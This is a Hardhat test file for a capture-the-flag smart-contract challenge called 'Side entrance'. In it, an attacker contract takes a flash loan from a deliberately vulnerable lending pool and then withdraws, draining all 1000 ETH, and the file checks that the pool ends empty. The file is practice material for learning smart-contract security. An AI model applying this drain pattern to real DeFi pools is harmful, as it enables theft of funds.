const { ethers } = require('hardhat');
const { expect } = require('chai');
const { hexStripZeros } = require('@ethersproject/bytes');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
        
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const Exploiter = await ethers.getContractFactory('FlashLoanEtherReceiver', attacker) ;
        var exploiter = await Exploiter.deploy(this.pool.address);
        await exploiter.connect(attacker).flashloan(ETHER_IN_POOL);
        console.log(exploiter.address)
        console.log(deployer.address)
        console.log("balance of exploiter", await this.pool.balances(exploiter.address));
        await exploiter.connect(attacker).withdraw();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
